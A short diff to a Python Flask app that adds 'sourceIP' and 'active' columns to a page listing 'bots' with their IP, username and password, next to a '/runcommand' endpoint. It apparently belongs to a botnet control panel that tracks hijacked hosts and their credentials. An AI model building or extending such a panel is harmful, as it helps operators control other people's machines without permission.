@@ -37,7 +37,7 @@ def page_not_found(e):
 @app.route('/')
 def index():
     bots = getBots().get_json()
-    heads = ["botId","ip","username","password","loaded","directoryName"]
+    heads = ["botId","ip","username","password","sourceIP","active","loaded","directoryName"]
     return render_template('index.html',bots=list(bots.values()),heads=heads)
 
 @app.route('/runcommand',methods=['POST'])
